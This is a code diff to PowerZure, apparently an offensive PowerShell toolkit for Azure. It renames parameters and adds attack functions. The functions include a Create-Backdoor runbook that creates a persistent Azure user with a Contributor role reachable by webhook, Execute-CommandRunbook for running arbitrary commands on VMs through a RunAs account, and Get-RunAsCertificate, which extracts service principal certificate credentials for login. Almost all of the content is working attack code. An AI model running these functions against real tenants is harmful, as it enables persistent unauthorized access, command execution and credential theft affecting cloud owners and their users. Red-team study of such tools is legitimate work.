@@ -14,7 +14,7 @@ If ($Modules.Name -contains 'Az')
 Else
 {
     Write-Host "Az Module not installed. Installing."
-    #This installs the Az module
+    #This installs the Az PoSh module
     Install-Module -Name Az -AllowClobber
     #This installs the Az CLI modules
     Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'
@@ -130,10 +130,11 @@ Reader          Set-Subscription - Sets the default Subscription to operate in
 Contributor     Execute-Command - Will run a command on a specified VM
 Contributor     Execute-MSBuild - Will run a supplied MSBuild payload on a specified VM. By default, Azure VMs have .NET 4.0 installed. Requires Contributor Role. Will run as SYSTEM.
 Contributor     Execute-Program - Executes a supplied program. 
-Administrator   Create-Backdoor - Will create a Runbook that creates an Azure account and generates a Webhook to that Runbook so it can be executed if you lose access to Azure. 
+Global Administrator	Create-Backdoor - Will create a Runbook that creates an Azure account and generates a Webhook to that Runbook so it can be executed if you lose access to Azure. 
                 Also gives the ability to upload your own .ps1 file as a Runbook (Customization)
                 This requires an account that is part of the 'Administrators' Role (Needed to make a user)
-Administrator   Execute-Backdoor - This runs the backdoor that is created with "Create-Backdoor". Needs the URI generated from Create-Backdoor
+Global Administrator	Execute-Backdoor - This runs the backdoor that is created with "Create-Backdoor". Needs the URI generated from Create-Backdoor
+Contributor		Execute-CommandRunbook - Will execute a command from a runbook that is ran with a "RunAs" account
 Contributor     Upload-StorageContent - Uploads a supplied file to a storage share.
 Contributor     Stop-VM - Stops a VM
 Contributor     Start-VM - Starts a VM
@@ -141,7 +142,7 @@ Contributor     Restart-VM - Restarts a VM
 Contributor     Start-Runbook - Starts a specific Runbook
 Owner           Set-Role - Adds a user to a role for a resource or a subscription
 Owner           Remove-Role -Removes a user from a role on a resource or subscription
-Administrator   Set-Group - Adds a user to an Azure AD group
+Global Administrator   Set-Group - Adds a user to an Azure AD group
 
 
                 ------------------Info Gathering -------------
@@ -164,6 +165,7 @@ Reader          Get-Apps - Returns all applications and their Ids
 Reader          Get-AppPermissions - Returns the permissions of an app
 Reader          Get-WebApps - Gets running webapps
 Reader          Get-WebAppDetails - Gets running webapps details
+Contributor 	Get-RunAsCertificate - Gets the login credentials for an Automation Accounts "RunAs" service principal
 
                 ---------Secret/Key/Certificate Gathering -----
             
@@ -1884,17 +1886,17 @@ function Create-Backdoor
 .PARAMETER
     -Username (Username you used to login to Azure with, that has permissions to create a Runbook and user)
     -Password (Password to that account)
-    -Account (Azure Automation Account name)
+    -AutomationAccount (Azure Automation Account name)
     -ResourceGroup (Resource Group)
     -NewUsername (Username you want to create)
     -NewPassword (Password for that new account)
 
 .EXAMPLE
-    Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -Group ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd 
+    Create-Backdoor -Username Administrator@contoso.com -Password Password! -AutomationAccount AutomationAccountExample -Group ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd 
 #>
         [CmdletBinding()]
          Param(
-        [Parameter(Mandatory=$false)][String]$Account = $null,
+        [Parameter(Mandatory=$false)][String]$AutomationAccount = $null,
         [Parameter(Mandatory=$false)][String]$Username = $null,
         [Parameter(Mandatory=$false)][String]$Password = $null,
         [Parameter(Mandatory=$false)][String]$NewUsername = $null,
@@ -1904,32 +1906,32 @@ function Create-Backdoor
      if($ResourceGroup -eq "")
      {
         Write-Host "Requires Resource Group name" -ForegroundColor Red
-        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
+        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -AutomationAccount AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
      }
-     elseif($Account -eq "")
+     elseif($AutomationAccount -eq "")
      {
         Write-Host "Requires an Automation Account name" -ForegroundColor Red
-        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
+        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -AutomationAccount AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
      }
      elseif($Username -eq "")
      {
         Write-Host "Requires an Administrative username" -ForegroundColor Red
-        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
+        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -AutomationAccount AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
      }
      elseif($Password -eq "")
      {
         Write-Host "Requires an Administrative password" -ForegroundColor Red
-        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
+        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -AutomationAccount AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
      }
      elseif($NewUsername -eq "")
      {
         Write-Host "Requires a new username" -ForegroundColor Red
-        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
+        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -AutomationAccount AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
      }
      elseif($NewPassword -eq "")
      {
         Write-Host "Requires a new password." -ForegroundColor Red
-        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
+        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -AutomationAccount AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
      }
      else
      {
@@ -1937,7 +1939,7 @@ function Create-Backdoor
             $formatted = $date.ToString("MM/dd/yyyy")
             if($File)
             {
-                Import-AzAutomationRunbook -Path .\$File -ResourceGroup $ResourceGroup -AutomationAccountName $Account -Type PowerShell
+                Import-AzAutomationRunbook -Path .\$File -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell
             }
             else
             {
@@ -1948,12 +1950,12 @@ function Create-Backdoor
                 $data = "az login -u $Username -p $Password" | Out-File AzureAutomationTutorialPowerShell.ps1
                 $data2 = "az ad user create --display-name $DisplayName --password $NewPassword --user-principal-name $NewUsername" | Out-File -Append AzureAutomationTutorialPowerShell.ps1
                 $data4 = "az role assignment create --assignee $NewUPN --role Contributor" | Out-File -Append AzureAutomationTutorialPowerShell.ps1
-                Import-AzAutomationRunbook -Path .\AzureAutomationTutorialPowerShell.ps1 -ResourceGroup $ResourceGroup -AutomationAccountName $Account -Type PowerShell
-                Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $Account -Name AzureAutomationTutorialPowerShell
+                Import-AzAutomationRunbook -Path .\AzureAutomationTutorialPowerShell.ps1 -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell
+                Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AzureAutomationTutorialPowerShell
                 Write-Host ""
                 Write-Host "--------------------"
                 Write-Host "COPY THE URI BELOW, IT IS NOT RETRIEVABLE. PASS IT INTO Execute-BackDoor TO RUN IT"
-                New-AzAutomationWebhook -Name "AzureAutomationTutorialPowerShell" -ResourceGroup $ResourceGroup -AutomationAccountName $Account -RunbookName "AzureAutomationTutorialPowerShell" -Force -IsEnabled $True -ExpiryTime $formatted
+                New-AzAutomationWebhook -Name "AzureAutomationTutorialPowerShell" -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -RunbookName "AzureAutomationTutorialPowerShell" -Force -IsEnabled $True -ExpiryTime $formatted
                 rm AzureAutomationTutorialPowerShell.ps1
             }
         }
@@ -2253,4 +2255,209 @@ $assignments = az role assignment list --all --query "[?principalName=='$UID'].{
 			}
 		}
 }
+function Get-RolePermissions
+{
+<#
+.SYNOPSIS 
+    Finds all roles with a certain permission
+	
+.PARAMETER
+    -Permission
 
+.EXAMPLE
+    Get-RolePermissions -Permission virtualMachines/*
+#>
+	[CmdletBinding()]
+	 Param(
+	[Parameter(Mandatory=$true)][String]$Permission = $null)
+	$roles=az role definition list | convertfrom-json
+	ForEach($role in $roles)
+	{
+		If($role.roleType -eq "BuiltInRole")
+		{
+			$rolename = $role.roleName 
+			if ($role.permissions.actions -match "$Permission")
+			{		
+				Write-host ""
+				Write-host $rolename -ForeGroundColor Green
+				Write-host ""
+				$role.permissions.actions -match "$Permission"
+			}
+		}
+	}
+}
+function Execute-CommandRunbook
+{
+<#
+.SYNOPSIS 
+    Will execute a supplied command or script from a Runbook if the Runbook is configured with a "RunAs" account
+	
+.PARAMETER
+    -AutomationAccount
+	-ResourceGroup
+	-VM
+	-Command
+	-Script
+.EXAMPLE
+    Execute-CommandRunbook -AutomationAccount TestAccount -ResourceGroup TestRG -VM Win10Test -Command whoami
+	Execute-CommandRunbook -AutomationAccount TestAccount -ResourceGroup TestRG -VM Win10Test -Script "C:\temp\test.ps1"
+#>
+	[CmdletBinding()]
+	 Param(
+	[Parameter(Mandatory=$false)][String]$AutomationAccount = $null,
+	[Parameter(Mandatory=$false)][String]$ResourceGroup = $null,
+	[Parameter(Mandatory=$false)][String]$VM = $null,
+	[Parameter(Mandatory=$false)][String]$Script = $null,
+	[Parameter(Mandatory=$false)][String]$Command = $null)
+	$Usage = "Execute-CommandRunbook -AutomationAccount TestAccount -ResourceGroup TestRG -VM Win10Test -Command whoami"
+	If(!$ResourceGroup)
+	{
+	Write-Host "Requires a resource group name." -ForegroundColor Red
+	$Usage
+	}
+	If(!$VM)
+	{
+	Write-Host "Requires a VM name." -ForegroundColor Red
+	$Usage
+	}	
+	If(!$AutomationAccount)
+	{
+	Write-Host "Requires an automation account name." -ForegroundColor Red
+	$Usage
+	}
+	$vmdetails = az vm show -n $VM -g $ResourceGroup | ConvertFrom-Json
+	$OS = $vmdetails.licenseType
+	New-AzAutomationModule -AutomationAccountName $AutomationAccount -Name "AzureRM.Compute" -ContentLink https://github.com/hausec/PowerZure/blob/Dev/azurerm.compute.5.9.1.zip?raw=true -ResourceGroupName $ResourceGroup | Out-Null
+	If($OS -match "Windows")
+	{
+		$data  = '$VMname = ' + '"' + $VM + '"'| Out-File -Append AzureAutomationTutorialPowerShell.ps1
+		$data1 = '$connectionName = "AzureRunAsConnection"' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
+		$data2 = '$servicePrincipalConnection=Get-AutomationConnection -Name $connectionName' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
+		$data3 = 'Add-AzureRmAccount ` -ServicePrincipal ` -TenantId $servicePrincipalConnection.TenantId ` -ApplicationId $servicePrincipalConnection.ApplicationId ` -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
+		$data4 = 'New-Item C:\temp\test.ps1' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
+		$data5 = "echo $Command >> C:\temp\test.ps1" | Out-File -Append AzureAutomationTutorialPowerShell.ps1
+		$data6 = '$z = Invoke-AzureRmVMRunCommand -ResourceGroupName ' + $ResourceGroup + ' -VMName ' + $VM + ' -CommandId RunPowerShellScript -ScriptPath "C:\temp\test.ps1"' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
+		$data7 = '$z.Value[0].Message' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
+		Write-Host "Uploading Runbook..." -ForegroundColor Green
+		Import-AzAutomationRunbook -Path .\AzureAutomationTutorialPowerShell.ps1 -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell | Out-Null
+		Write-Host "Publishing Runbook..." -ForegroundColor Green
+		Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AzureAutomationTutorialPowerShell	| Out-Null
+		Write-Host "Starting Runbook..." -ForegroundColor Green
+		$start = Start-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AzureAutomationTutorialPowerShell	
+		$jobid = $start.JobId
+		$timer = [Diagnostics.Stopwatch]::StartNew()
+		$value = $null
+		$Timeout = 180
+		While (!$value -and ($timer.Elapsed.TotalSeconds -lt $Timeout))
+		{
+			$ErrorActionPreference = "SilentlyContinue"
+			Write-Host "Waiting for Runbook Output..." -ForegroundColor Green
+			Start-Sleep -s 10
+			$record = Get-AzAutomationJobOutput -ResourceGroupName $ResourceGroup -AutomationAccountName $AutomationAccount -Id $jobid -Stream Any | Get-AzAutomationJobOutputRecord
+			$value = $record.Value[2].value
+
+		}
+		$timer.Stop()
+		$value
+		Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AzureAutomationTutorialPowerShell -Force
+		rm AzureAutomationTutorialPowerShell.ps1
+	}
+	else
+	{
+		$data  = '$VMname = ' + '"' + $VM + '"'| Out-File -Append BashAutomationTutorial.sh
+		$data1 = '$connectionName = "AzureRunAsConnection"' | Out-File -Append BashAutomationTutorial.sh
+		$data2 = '$servicePrincipalConnection=Get-AutomationConnection -Name $connectionName' | Out-File -Append BashAutomationTutorial.sh
+		$data3 = 'Add-AzureRmAccount ` -ServicePrincipal ` -TenantId $servicePrincipalConnection.TenantId ` -ApplicationId $servicePrincipalConnection.ApplicationId ` -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint' | Out-File -Append BashAutomationTutorial.sh
+		$data4 = 'New-Item test.sh' | Out-File -Append BashAutomationTutorial.sh
+		$data5 = "echo $Command >> test.sh" | Out-File -Append BashAutomationTutorial.sh
+		$data6 = '$z = Invoke-AzureRmVMRunCommand -ResourceGroupName ' + $ResourceGroup + ' -VMName ' + $VM + ' -CommandId RunShellScript -ScriptPath "./test1.sh"' | Out-File -Append BashAutomationTutorial.sh
+		$data7 = '$z.Value[0].Message' | Out-File -Append BashAutomationTutorial.sh
+		Write-Host "Uploading Runbook..." -ForegroundColor Green
+		Import-AzAutomationRunbook -Path .\BashAutomationTutorial.sh -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell
+		Write-Host "Publishing Runbook..." -ForegroundColor Green
+		Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name BashAutomationTutorial
+		Write-Host "Starting Runbook..." -ForegroundColor Green
+		$start = Start-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name BashAutomationTutorial	
+		$jobid = $start.JobId
+		$timer = [Diagnostics.Stopwatch]::StartNew()
+		$value = $null
+		$Timeout = 180
+		While (!$value -and ($timer.Elapsed.TotalSeconds -lt $Timeout))
+		{
+			$ErrorActionPreference = "SilentlyContinue"
+			Write-Host "Waiting for Runbook Output..." -ForegroundColor Green
+			Start-Sleep -s 10
+			$record = Get-AzAutomationJobOutput -ResourceGroupName $ResourceGroup -AutomationAccountName $AutomationAccount -Id $jobid -Stream Any | Get-AzAutomationJobOutputRecord
+			$value = $record.Value[2].value
+
+		}
+		$value
+		$timer.Stop()
+		Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name BashAutomationTutorial -Force
+		rm BashAutomationTutorial.sh
+	}
+}
+function Get-RunAsCertificate
+{
+<#
+.SYNOPSIS 
+    Will gather a RunAs accounts certificate which can then be used to login as that account. By default, RunAs accounts are contributors over the subscription. This function does take a minute to run.
+	
+.PARAMETER
+    -AutomationAccount
+	-ResourceGroup
+.EXAMPLE
+    Get-RunAsCertificate -ResourceGroup Test_RG -AutomationAccount TestAccount
+#>
+
+	[CmdletBinding()]
+	 Param(
+	[Parameter(Mandatory=$false)][String]$AutomationAccount = $null,
+	[Parameter(Mandatory=$false)][String]$ResourceGroup = $null)
+
+	$Usage = "Get-RunAsCertificate -ResourceGroup Test_RG -AutomationAccount TestAccount"
+	If(!$ResourceGroup)
+	{
+	Write-Host "Requires a resource group name." -ForegroundColor Red
+	$Usage
+	}
+	If(!$AutomationAccount)
+	{
+	Write-Host "Requires an automation account name." -ForegroundColor Red
+	$Usage
+	}
+	$data1 = 'Get-AutomationConnection -Name AzureRunAsConnection' | Out-File AutomationTutorialPowerShell.ps1
+	Write-Host "Uploading Runbook..." -ForegroundColor Green
+	Import-AzAutomationRunbook -Path .\AutomationTutorialPowerShell.ps1 -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell | Out-Null
+	Write-Host "Publishing Runbook..." -ForegroundColor Green
+	Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AutomationTutorialPowerShell| Out-Null
+	Write-Host "Starting Runbook..." -ForegroundColor Green
+	$start = Start-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AutomationTutorialPowerShell	
+	$jobid = $start.JobId
+	Start-Sleep -s 10
+	$record = Get-AzAutomationJobOutput -ResourceGroupName $ResourceGroup -AutomationAccountName $AutomationAccount -Id $jobid -Stream Any | Get-AzAutomationJobOutputRecord
+	$Timeout = 60
+	$timer = [Diagnostics.Stopwatch]::StartNew()
+	While (!$record -and ($timer.Elapsed.TotalSeconds -lt $Timeout))
+	{
+	Write-Host "Waiting for Runbook Output..." -ForegroundColor Yellow
+	Start-Sleep -s 10
+	$record = Get-AzAutomationJobOutput -ResourceGroupName $ResourceGroup -AutomationAccountName $AutomationAccount -Id $jobid -Stream Any | Get-AzAutomationJobOutputRecord
+	}
+	$timer.Stop()
+	If (!$record)
+	{
+	Write-host "No RunAs account configured for this Automation Account."
+	}
+	else
+	{
+	$thumbprint = $record.Value.CertificateThumbprint
+	$tenant = $record.Value.TenantId
+	$appID = $record.Value.ApplicationId
+	Write-Host "Done! To login as the service principal, copy+paste the following command: " -ForegroundColor Green
+	Write-Host ""
+	Write-Host "Connect-AzAccount -CertificateThumbprint "$thumbprint" -ApplicationId "$appID" -Tenant "$tenant"" -ForegroundColor Green
+	}
+	Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AutomationTutorialPowerShell -Force
+	rm AutomationTutorialPowerShell.ps1
+}
